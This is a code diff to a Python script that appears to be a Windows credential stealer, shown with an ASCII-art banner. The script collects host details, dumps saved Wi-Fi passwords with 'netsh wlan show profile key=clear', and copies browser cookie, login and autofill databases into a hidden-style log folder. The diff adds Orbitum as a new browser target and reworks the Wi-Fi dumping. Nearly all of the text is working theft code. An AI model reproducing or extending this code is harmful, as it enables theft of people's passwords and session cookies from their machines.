@@ -17,6 +17,7 @@ try:
 		os.system("cls")
 		windll = ctypes.windll.kernel32
 		lang = locale.windows_locale[windll.GetUserDefaultUILanguage()]
+		encoding = locale.getpreferredencoding()
 		typeos = platform.system() + " " + platform.release()
 		timedate = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
 		time = datetime.datetime.now().strftime("%H:%M:%S").replace(":", "-", 2)
@@ -26,7 +27,7 @@ try:
 		lip = socket.gethostbyname(socket.gethostname())
 		timedate = "{~} " + timedate
 		dirname = user + "_" + time
-
+		prefix = "{~}"
 		print("""
 	 ___      ___   __     __   ___   _______        __      
 	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
@@ -47,6 +48,7 @@ try:
 		dio = path + "\\" + dirname
 		os.makedirs(dio)
 		os.makedirs(dio + "\\Documents")
+
 		def find(pattern, path, pok):
 			global result
 			result = 0
@@ -74,11 +76,8 @@ try:
 		ressw = int(res1w) + int(res2w)
 		print(" 	{~} found .docx: ", ressw)
 
-		def logs():
-			global logfile
-			logfile = open(dio + "\\" + user + "-log" + ".json", "w")
-			logfile.write(
-			"""
+		logfile = open(dio + "\\" + user + "-log" + ".json", "w")
+		logfile.write("""
 	 ___      ___   __     __   ___   _______        __      
 	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
 	 \   \  //   | ||  |  (: |/   / |:        |    /    \    
@@ -95,33 +94,33 @@ try:
 	hostname: {2}
 	username: {3}
 	local ip: {4}
-	""".format(timedate, typeos , hostname, user, lip))
-		logs()
+	""".format(timedate, typeos, hostname, user, lip))
 
 		def networkpass(one, two):
-			cost = 0
-			prefix = "{~}"
-			logfile.write("Wi-Fi's [\n")
+			try:
+				cost = 0
+				data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode(encoding).split('\n')
+				profiles = [i.split(":")[1][1:-1] for i in data if one in i]
+				logfile.write("Wi-Fi's [\n")
+				for i in profiles:
+					results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(encoding).split('\n')
+					results = [b.split(":")[1][1:-1] for b in results if two in b]
+					try:
+						logfile.write("		{0}:{1}\n".format(i, results[0]))
+						cost += 1
+					except IndexError:
+						logfile.write("		{0}:{1}\n".format(i, ""))
 
-			data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp1125').split('\n')
-			profiles = [i.split(":")[1][1:-1] for i in data if one in i]
-
-			for i in profiles:
-				results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp1125').split('\n')
-				results = [b.split(":")[1][1:-1] for b in results if two in b]
-				try:
-					logfile.write("		{0}:{1}\n".format(i, results[0]))
-					cost += 1
-				except IndexError:
-					logfile.write("		{0}:{1}\n".format(i, ""))
-
-			logfile.write("	]")
-			print(" 	{0} found {1} network/s password/s".format(prefix, cost))
+				print(" 	{0} found {1} network/s password/s".format(prefix, cost))
+			except:
+				print(" 	{0} found {1} network/s password/s".format(prefix, cost))
 
 		if lang == "en_US":
 			networkpass("All User Profile", "Key Content")
+			logfile.write("	]")
 		elif lang == "ru_RU":
 			networkpass("Все профили пользователей", "Содержимое ключа")
+			logfile.write("	]")
 
 		def browsers():
 			if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome/User Data/Default/".format(user)):
@@ -300,10 +299,27 @@ try:
 					find("Web Data", src, "\\Atom\\")
 					print(" 	{+} Atom")
 				except OSError:
-					print(" 	{+} Atom")	
+					print(" 	{+} Atom")
+
+
+			if os.path.exists("C:/Users/{0}/AppData/Local/Orbitum/User Data/Default".format(user)):
+				src = "C:/Users/{0}/AppData/Local/Orbitum/User Data/Default".format(user)
+				if os.path.exists(dio + "\\Orbitum"):
+					shutil.rmtree(dio + "\\Orbitum")
+				os.makedirs(dio + "\\Orbitum")
+				try:
+					find("Cookies", src, "\\Orbitum\\")
+					find("Bookmarks", src, "\\Orbitum\\")
+					find("History", src, "\\Orbitum\\")
+					find("Login Data", src, "\\Orbitum\\")
+					find("Web Data", src, "\\Orbitum\\")
+					print(" 	{+} Orbitum")
+				except OSError:
+					print(" 	{+} Orbitum")		
 		browsers()
 		print(")")
 		logfile.write("\n)")
+		logfile.close()
 		os._exit(0)
 		#ctypes.windll.kernel32.SetFileAttributesW(dio, 0x02)
 		#os.system("cls")
